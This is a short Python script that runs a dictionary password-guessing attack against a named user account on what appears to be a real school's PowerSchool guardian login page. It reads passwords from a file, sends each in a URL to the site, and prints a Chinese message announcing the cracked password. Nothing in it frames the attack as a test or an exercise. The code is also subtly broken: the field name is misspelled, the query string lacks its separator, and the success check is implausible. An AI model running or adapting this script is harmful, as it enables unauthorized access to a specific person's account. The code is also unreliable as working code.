import urllib
import urllib.request

f = open(r"pass.txt")

while 1:
    pwd = f.readline().strip()
    if not pwd:
        print('字典已比对完。')
        break

    data = {}

    data['passworld'] = pwd
    data['username'] = 'angel.guo16'

    url_parame = urllib.parse.urlencode(data)

    url = "https://powerschool.ycis-schools.com/guardian/home.html"

    all_url = url + url_parame

    data = urllib.request.urlopen(all_url).read()

    record = data.decode('UTF-8')

    if record == 'ok':
        print('破解出来了，密码为',pwd)
        break
    else:
        print('error')